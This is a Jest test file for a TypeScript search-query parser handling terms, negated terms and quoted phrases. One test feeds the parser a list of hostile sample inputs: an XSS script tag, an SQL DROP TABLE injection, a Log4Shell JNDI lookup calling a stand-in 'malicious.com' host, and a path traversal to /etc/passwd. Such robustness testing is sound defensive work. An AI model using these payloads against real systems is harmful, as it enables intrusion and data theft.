// src/utils/__tests__/parseQuery.test.ts
// Tests for query parsing utility with security considerations

import { parseQuery, hasNegativeMatch, hasAllPhrases, matchesParsedQuery, validateParsedQuery } from '../parseQuery';

// Mock sanitize function
jest.mock('../../services/searchUtils', () => ({
  sanitize: jest.fn((input: string) => {
    // Simple mock implementation
    return input.normalize('NFKD').replace(/[\u0300-\u036f]/g, '').toLowerCase();
  }),
}));

describe('parseQuery', () => {
  describe('basic parsing', () => {
    it('should parse positive terms only', () => {
      const result = parseQuery('employment contract legal');
      
      expect(result).toEqual({
        positive: ['employment', 'contract', 'legal'],
        negatives: [],
        phrases: [],
      });
    });

    it('should parse negative terms', () => {
      const result = parseQuery('employment -temporary -contractor');
      
      expect(result).toEqual({
        positive: ['employment'],
        negatives: ['temporary', 'contractor'],
        phrases: [],
      });
    });

    it('should parse quoted phrases', () => {
      const result = parseQuery('employment "non compete clause" legal');
      
      expect(result).toEqual({
        positive: ['employment', 'legal'],
        negatives: [],
        phrases: ['non compete clause'],
      });
    });

    it('should parse complex queries with all types', () => {
      const result = parseQuery('employment "non compete" -temporary contract -freelance "full time"');
      
      expect(result).toEqual({
        positive: ['employment', 'contract'],
        negatives: ['temporary', 'freelance'],
        phrases: ['non compete', 'full time'],
      });
    });

    it('should handle empty queries', () => {
      const result = parseQuery('');
      
      expect(result).toEqual({
        positive: [],
        negatives: [],
        phrases: [],
      });
    });

    it('should handle whitespace-only queries', () => {
      const result = parseQuery('   \t\n   ');
      
      expect(result).toEqual({
        positive: [],
        negatives: [],
        phrases: [],
      });
    });
  });

  describe('edge cases and malicious inputs', () => {
    it('should handle extremely long input strings', () => {
      const longString = 'a'.repeat(10000);
      const result = parseQuery(longString);
      
      expect(result.positive).toHaveLength(1);
      expect(result.positive[0]).toBe('a'.repeat(10000).toLowerCase());
    });

    it('should handle many negative terms', () => {
      const manyNegatives = Array.from({ length: 100 }, (_, i) => `-term${i}`).join(' ');
      const result = parseQuery(manyNegatives);
      
      expect(result.positive).toHaveLength(0);
      expect(result.negatives).toHaveLength(100);
      expect(result.negatives[0]).toBe('term0');
      expect(result.negatives[99]).toBe('term99');
    });

    it('should handle many quoted phrases', () => {
      const manyPhrases = Array.from({ length: 50 }, (_, i) => `"phrase ${i}"`).join(' ');
      const result = parseQuery(manyPhrases);
      
      expect(result.positive).toHaveLength(0);
      expect(result.phrases).toHaveLength(50);
      expect(result.phrases[0]).toBe('phrase 0');
      expect(result.phrases[49]).toBe('phrase 49');
    });

    it('should handle nested quotes safely', () => {
      const result = parseQuery('"outer "inner" quote"');
      
      // Should match the first complete quoted string
      expect(result.phrases).toContain('outer ');
      expect(result.positive).toContain('quote');
    });

    it('should handle unclosed quotes', () => {
      const result = parseQuery('employment "unclosed quote contract');
      
      expect(result.positive).toEqual(['employment', 'contract']);
      expect(result.phrases).toHaveLength(0);
    });

    it('should handle special regex characters in queries', () => {
      const result = parseQuery('test.*$^+?{}[]|()\\');
      
      expect(result.positive).toHaveLength(1);
      expect(result.positive[0]).toContain('test');
    });

    it('should handle Unicode and accented characters', () => {
      const result = parseQuery('café "résumé français" -naïve');
      
      expect(result.positive).toContain('cafe');
      expect(result.phrases).toContain('resume francais');
      expect(result.negatives).toContain('naive');
    });

    it('should handle mixed case properly', () => {
      const result = parseQuery('Employment "Non Compete" -TEMPORARY');
      
      expect(result.positive).toContain('employment');
      expect(result.phrases).toContain('Non Compete');
      expect(result.negatives).toContain('temporary');
    });

    it('should handle malicious injection attempts', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '${jndi:ldap://malicious.com/a}',
        '../../../etc/passwd',
        '%00%0a%0d%1f%8b%08%00%00%00%00%00',
      ];

      maliciousInputs.forEach(input => {
        const result = parseQuery(input);
        
        // Should safely parse without throwing errors
        expect(result).toBeDefined();
        expect(Array.isArray(result.positive)).toBe(true);
        expect(Array.isArray(result.negatives)).toBe(true);
        expect(Array.isArray(result.phrases)).toBe(true);
      });
    });

    it('should handle excessive whitespace', () => {
      const result = parseQuery('   employment    "full    time"    -temporary   ');
      
      expect(result.positive).toEqual(['employment']);
      expect(result.phrases).toEqual(['full    time']);
      expect(result.negatives).toEqual(['temporary']);
    });
  });

  describe('phrase parsing specifics', () => {
    it('should handle phrases with special characters', () => {
      const result = parseQuery('"non-compete & confidentiality"');
      
      expect(result.phrases).toEqual(['non-compete & confidentiality']);
    });

    it('should handle empty phrases', () => {
      const result = parseQuery('employment "" contract');
      
      expect(result.positive).toEqual(['employment', 'contract']);
      expect(result.phrases).toHaveLength(0);
    });

    it('should handle phrases with only whitespace', () => {
      const result = parseQuery('employment "   " contract');
      
      expect(result.positive).toEqual(['employment', 'contract']);
      expect(result.phrases).toHaveLength(0);
    });
  });

  describe('negative term parsing specifics', () => {
    it('should handle negative terms with numbers', () => {
      const result = parseQuery('contract -temp2hire -1099');
      
      expect(result.positive).toEqual(['contract']);
      expect(result.negatives).toEqual(['temp2hire', '1099']);
    });

    it('should ignore invalid negative patterns', () => {
      const result = parseQuery('contract - invalid -valid');
      
      expect(result.positive).toEqual(['contract', 'invalid']);
      expect(result.negatives).toEqual(['valid']);
    });

    it('should handle negative terms at start and end', () => {
      const result = parseQuery('-start contract -end');
      
      expect(result.positive).toEqual(['contract']);
      expect(result.negatives).toEqual(['start', 'end']);
    });
  });
});

describe('hasNegativeMatch', () => {
  it('should return false when no negatives', () => {
    const keywords = ['employment', 'contract', 'full-time'];
    const negatives: string[] = [];
    
    expect(hasNegativeMatch(keywords, negatives)).toBe(false);
  });

  it('should return true when negative matches', () => {
    const keywords = ['employment', 'contract', 'temporary'];
    const negatives = ['temporary', 'freelance'];
    
    expect(hasNegativeMatch(keywords, negatives)).toBe(true);
  });

  it('should return false when no negative matches', () => {
    const keywords = ['employment', 'contract', 'full-time'];
    const negatives = ['temporary', 'freelance'];
    
    expect(hasNegativeMatch(keywords, negatives)).toBe(false);
  });

  it('should handle case insensitive matching', () => {
    const keywords = ['employment', 'Contract', 'TEMPORARY'];
    const negatives = ['temporary'];
    
    expect(hasNegativeMatch(keywords, negatives)).toBe(true);
  });

  it('should handle empty keywords array', () => {
    const keywords: string[] = [];
    const negatives = ['temporary'];
    
    expect(hasNegativeMatch(keywords, negatives)).toBe(false);
  });
});

describe('hasAllPhrases', () => {
  it('should return true when no phrases required', () => {
    const keywords = ['employment', 'contract'];
    const phrases: string[] = [];
    
    expect(hasAllPhrases(keywords, phrases)).toBe(true);
  });

  it('should return true when all phrases found', () => {
    const keywords = ['employment', 'contract', 'non', 'compete', 'clause'];
    const phrases = ['non compete', 'employment contract'];
    
    expect(hasAllPhrases(keywords, phrases)).toBe(true);
  });

  it('should return false when phrases missing', () => {
    const keywords = ['employment', 'contract'];
    const phrases = ['non compete', 'full time'];
    
    expect(hasAllPhrases(keywords, phrases)).toBe(false);
  });

  it('should handle case insensitive phrase matching', () => {
    const keywords = ['Employment', 'CONTRACT', 'Non', 'COMPETE'];
    const phrases = ['employment contract', 'non compete'];
    
    expect(hasAllPhrases(keywords, phrases)).toBe(true);
  });

  it('should handle partial word matches in phrases', () => {
    const keywords = ['employee', 'contractor', 'noncompete'];
    const phrases = ['employee contract'];
    
    expect(hasAllPhrases(keywords, phrases)).toBe(false);
  });

  it('should handle empty keywords array', () => {
    const keywords: string[] = [];
    const phrases = ['employment contract'];
    
    expect(hasAllPhrases(keywords, phrases)).toBe(false);
  });
});

describe('matchesParsedQuery', () => {
  it('should return true for matching query', () => {
    const keywords = ['employment', 'contract', 'full-time', 'legal'];
    const parsedQuery = {
      positive: ['employment', 'contract'],
      negatives: ['temporary'],
      phrases: ['full time'],
    };
    
    expect(matchesParsedQuery(keywords, parsedQuery)).toBe(true);
  });

  it('should return false when negative terms match', () => {
    const keywords = ['employment', 'contract', 'temporary'];
    const parsedQuery = {
      positive: ['employment'],
      negatives: ['temporary'],
      phrases: [],
    };
    
    expect(matchesParsedQuery(keywords, parsedQuery)).toBe(false);
  });

  it('should return false when required phrases missing', () => {
    const keywords = ['employment', 'contract'];
    const parsedQuery = {
      positive: ['employment'],
      negatives: [],
      phrases: ['non compete'],
    };
    
    expect(matchesParsedQuery(keywords, parsedQuery)).toBe(false);
  });

  it('should handle complex matching scenarios', () => {
    const keywords = ['software', 'engineer', 'full', 'time', 'remote', 'javascript'];
    const parsedQuery = {
      positive: ['software', 'engineer'],
      negatives: ['contract', 'temporary'],
      phrases: ['full time'],
    };
    
    expect(matchesParsedQuery(keywords, parsedQuery)).toBe(true);
  });
});

describe('validateParsedQuery', () => {
  it('should limit excessive terms', () => {
    const excessiveQuery = {
      positive: Array.from({ length: 100 }, (_, i) => `term${i}`),
      negatives: Array.from({ length: 100 }, (_, i) => `neg${i}`),
      phrases: Array.from({ length: 100 }, (_, i) => `phrase ${i}`),
    };
    
    const validated = validateParsedQuery(excessiveQuery);
    
    expect(validated.positive).toHaveLength(50);
    expect(validated.negatives).toHaveLength(50);
    expect(validated.phrases).toHaveLength(50);
  });

  it('should filter out excessively long terms', () => {
    const longString = 'a'.repeat(200);
    const queryWithLongTerms = {
      positive: ['normal', longString],
      negatives: ['normal', longString],
      phrases: ['normal phrase', longString],
    };
    
    const validated = validateParsedQuery(queryWithLongTerms);
    
    expect(validated.positive).toEqual(['normal']);
    expect(validated.negatives).toEqual(['normal']);
    expect(validated.phrases).toEqual(['normal phrase']);
  });

  it('should preserve normal queries unchanged', () => {
    const normalQuery = {
      positive: ['employment', 'contract'],
      negatives: ['temporary'],
      phrases: ['full time'],
    };
    
    const validated = validateParsedQuery(normalQuery);
    
    expect(validated).toEqual(normalQuery);
  });

  it('should handle empty queries', () => {
    const emptyQuery = {
      positive: [],
      negatives: [],
      phrases: [],
    };
    
    const validated = validateParsedQuery(emptyQuery);
    
    expect(validated).toEqual(emptyQuery);
  });
});